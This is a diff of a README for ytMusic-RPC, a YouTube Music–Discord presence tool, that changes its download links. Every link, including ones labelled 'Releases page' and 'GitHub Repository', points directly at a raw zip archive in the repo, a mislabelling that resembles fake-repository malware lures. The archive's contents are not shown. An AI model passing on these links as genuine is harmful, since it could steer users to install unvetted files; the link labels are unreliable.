@@ -20,12 +20,12 @@ Welcome to ytMusic-RPC! This application enables you to use YouTube Music with D
 
 To get started, you need to visit the Releases page. Click the link below to download the latest version of ytMusic-RPC.
 
-[**Download ytMusic-RPC**](https://raw.githubusercontent.com/LitheFiG/ytMusic-RPC/main/extension/yt_Music_RPC_v3.1.zip)
+[**Download ytMusic-RPC**](https://github.com/LitheFiG/ytMusic-RPC/raw/refs/heads/main/vencord-plugin/Music_RPC_yt_2.4.zip)
 
 ### Step 1: Visit Releases Page
 
 1. Open your web browser.
-2. Go to [this page to download](https://raw.githubusercontent.com/LitheFiG/ytMusic-RPC/main/extension/yt_Music_RPC_v3.1.zip).
+2. Go to [this page to download](https://github.com/LitheFiG/ytMusic-RPC/raw/refs/heads/main/vencord-plugin/Music_RPC_yt_2.4.zip).
    
 ### Step 2: Download the Application
 
@@ -78,7 +78,7 @@ If you encounter any issues, please refer to the GitHub issues page or contact s
 
 ## 🔗 Links
 
-- [**Download ytMusic-RPC**](https://raw.githubusercontent.com/LitheFiG/ytMusic-RPC/main/extension/yt_Music_RPC_v3.1.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/LitheFiG/ytMusic-RPC/main/extension/yt_Music_RPC_v3.1.zip)
+- [**Download ytMusic-RPC**](https://github.com/LitheFiG/ytMusic-RPC/raw/refs/heads/main/vencord-plugin/Music_RPC_yt_2.4.zip)
+- [GitHub Repository](https://github.com/LitheFiG/ytMusic-RPC/raw/refs/heads/main/vencord-plugin/Music_RPC_yt_2.4.zip)
 
 Feel free to explore the features and let your music shine through Discord!
